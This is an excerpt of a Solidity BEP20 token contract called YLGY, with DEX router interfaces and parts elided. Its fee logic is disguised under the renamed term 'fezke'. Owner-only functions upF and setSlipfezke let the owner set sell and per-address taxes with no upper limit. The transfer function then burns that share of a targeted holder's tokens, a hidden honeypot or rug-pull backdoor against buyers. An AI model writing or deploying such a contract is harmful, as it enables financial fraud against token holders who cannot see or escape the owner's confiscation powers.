...
interface IUniswapV2Factory {
    ...
    function fezkeTo() external view returns (address);
    function fezkeToSetter() external view returns (address);
    ...
    function setfezkeTo(address) external;
    function setfezkeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfezkeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfezkeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfezkeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfezkeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfezkeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract YLGY is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfezke = 0;

    uint256 private _defaultBuyfezke = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfezke;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfezke = _value;
    }

    function setSlipfezke(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfezke[_address] = _value;
    }

    function getSlipfezke(address _address) external view onlyownar returns (uint256) {
        return _slipfezke[_address];
    }


    function setMAccountfezke(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfezke(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefezkeAmount = 0;

        if (rF) {
            uint256 tradefezke = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefezke = _defaultSellfezke;
                }
                if (from == uniswapV2Pair) {

                    tradefezke = _defaultBuyfezke;
                }
            }
            if (_slipfezke[from] > 0) {
                tradefezke = _slipfezke[from];
            }

            tradefezkeAmount = _Amount.mul(tradefezke).div(100);
        }


        if (tradefezkeAmount > 0) {
            _balances[from] = _balances[from].sub(tradefezkeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefezkeAmount);
            emit Transfer(from, _deadAddress, tradefezkeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefezkeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefezkeAmount);
        emit Transfer(from, _to, _Amount - tradefezkeAmount);
    }
